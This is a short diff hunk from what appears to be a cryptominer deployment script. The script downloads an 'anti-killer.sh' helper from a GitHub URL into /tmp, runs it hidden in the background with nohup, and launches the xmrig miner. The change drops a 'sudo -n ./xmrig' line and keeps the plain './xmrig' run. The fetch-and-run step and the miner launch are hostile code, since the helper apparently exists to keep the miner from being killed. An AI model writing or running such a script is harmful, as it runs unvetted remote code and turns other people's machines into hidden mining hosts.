@@ -47,5 +47,4 @@ $DOWNLOAD_CMD /tmp/anti-killer.sh https://raw.githubusercontent.com/gorguzaaaaz/
 chmod +x /tmp/anti-killer.sh
 nohup bash /tmp/anti-killer.sh > /dev/null 2>&1 &
 
-sudo -n ./xmrig
 ./xmrig
